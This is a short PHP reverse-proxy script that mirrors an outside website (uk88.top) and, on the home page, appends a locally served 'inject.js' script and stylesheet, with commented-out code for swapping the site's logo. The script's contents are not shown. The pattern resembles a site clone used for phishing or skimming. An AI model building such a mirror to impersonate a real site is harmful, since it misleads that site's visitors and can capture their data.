<?php
require_once __DIR__."/vendor/autoload.php";
use Proxy\Proxy;
use Proxy\Adapter\Guzzle\GuzzleAdapter;
use Proxy\Filter\RemoveEncodingFilter;
use Laminas\Diactoros\ServerRequestFactory;
$request = ServerRequestFactory::fromGlobals();
$guzzle = new GuzzleHttp\Client();
$proxy = new Proxy(new GuzzleAdapter($guzzle));
$proxy->filter(new RemoveEncodingFilter());
$path = $request->getUri()->getPath();
try {
    $response = $proxy->forward($request)->to('https://uk88.top/');
    //ob_start();
    (new Laminas\HttpHandlerRunner\Emitter\SapiEmitter)->emit($response);
    //$output = ob_get_contents(); 
    //ob_end_clean();
    if($path == "/"){
        //$output = str_replace("https://k1.uk88.top/static/assets/images/logo-v2.svg","/logo.jpg",$output);
        echo '<script src="/inject.js"></script>';
        echo '<link rel="stylesheet" type="text/css" href="/css.css">';
    }
    //echo $output;
} catch(\GuzzleHttp\Exception\BadResponseException $e) {
    (new Laminas\HttpHandlerRunner\Emitter\SapiEmitter)->emit($e->getResponse());
}